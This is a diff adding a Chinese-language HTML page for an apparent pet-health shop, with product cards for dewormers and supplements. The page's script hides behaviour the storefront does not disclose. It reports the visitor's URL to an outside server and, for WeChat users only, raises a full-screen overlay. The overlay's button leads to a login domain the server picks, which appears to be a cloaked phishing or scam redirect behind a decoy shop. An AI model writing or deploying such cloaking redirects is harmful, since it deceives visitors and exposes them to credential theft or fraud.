@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安心宠医 · 宠物健康管家</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
+        body{background:#f4f9f4;}
+        .navbar{background:white;padding:0.8rem 5%;display:flex;justify-content:space-between;box-shadow:0 2px 8px #d4e2d4;}
+        .logo{color:#2d6a4f;font-weight:bold;font-size:1.4rem;}
+        .nav-links{display:flex;gap:1.5rem;list-style:none;}
+        .nav-links a{color:#1b4d3e;text-decoration:none;}
+        .consult-banner{background:#e9f5e9;margin:1.5rem 5%;padding:2rem;border-radius:32px;display:flex;justify-content:space-between;flex-wrap:wrap;align-items:center;}
+        .consult-banner h2{color:#1e6f5c;}
+        .pill-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.5rem;margin:2rem 5%;}
+        .med-card{background:white;border-radius:20px;padding:1rem;border-left:6px solid #2ecc71;box-shadow:0 6px 14px #e0efe0;}
+        .med-card img{width:100%;height:130px;object-fit:cover;border-radius:16px;}
+        .med-card h3{margin:0.6rem 0 0.2rem;}
+        .tag{background:#c8e6df;display:inline-block;padding:0.2rem 0.6rem;border-radius:20px;font-size:0.7rem;}
+        .doctor-intro{background:#d8f0e6;margin:2rem 5%;padding:1.2rem;border-radius:32px;text-align:center;}
+        @media (max-width:700px){.nav-links{display:none;}}
+        .wechat-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center;z-index:9999;display:none;}
+        .wechat-modal{width:280px;background:white;border-radius:24px;}
+        .enter-btn{background:#2d6a4f;border:none;color:white;padding:12px;border-radius:60px;margin:1rem auto;width:80%;display:block;cursor:pointer;}
+    </style>
+</head>
+<body>
+<div class="navbar"><div class="logo">🏥 安心宠医</div><ul class="nav-links"><li><a href="#">在线问诊</a></li><li><a href="#">驱虫药</a></li><li><a href="#">营养保健</a></li><li><a href="#">疫苗预约</a></li></ul></div>
+<div class="consult-banner"><div><h2>执业兽医1对1</h2><p>24小时在线答疑，处方药直达</p></div><div>🩺 首次咨询仅9.9元</div></div>
+<h2 style="margin:0 5%;color:#2c5e2c;">💊 健康养护专区</h2>
+<div class="pill-grid">
+    <div class="med-card"><img src="https://picsum.photos/id/42/400/300" alt="驱虫药"><h3>内外同驱滴剂</h3><div class="tag">兽药GMP认证</div><p>一支驱杀跳蚤、耳螨、蛔虫，温和配方</p></div>
+    <div class="med-card"><img src="https://picsum.photos/id/58/400/300" alt="益生菌"><h3>布拉迪益生菌</h3><div class="tag">调理肠胃</div><p>耐胃酸活菌，软便腹泻克星，改善消化</p></div>
+    <div class="med-card"><img src="https://picsum.photos/id/120/400/300" alt="关节素"><h3>软骨素关节粉</h3><div class="tag">养护关节</div><p>UC-II胶原+氨糖，老年犬猫必备</p></div>
+    <div class="med-card"><img src="https://picsum.photos/id/30/400/300" alt="洗耳液"><h3>耳道护理液</h3><div class="tag">温和抑菌</div><p>植物提取，清除耳垢预防耳螨</p></div>
+</div>
+<div class="doctor-intro">👩‍⚕️ 安心团队来自中国农大 | 全国宠物医院合作网点300+</div>
+<div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🐾 宠医健康通道</p><span>点击进入咨询</span></div><button class="enter-btn" id="enterBtn">立即进入</button></div></div>
+
+<script>
+(function(){
+    const m = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    m.style.display = "none";
+
+    // 若 URL 带有 login=true 则跳过弹窗和接口请求
+    if (location.search.includes('login=true')) return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若 rule_id 存在则追加参数
+    let apiUrl = "https://api.qlpdk.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                m.style.display = "flex";
+            }
+            if (d?.data?.loginDomain) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").onclick = function() {
+                    location.href = d.data.loginDomain;
+                };
+            }
+        })
+        .catch(e => {});
+
+    m.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
+</body>
+</html>
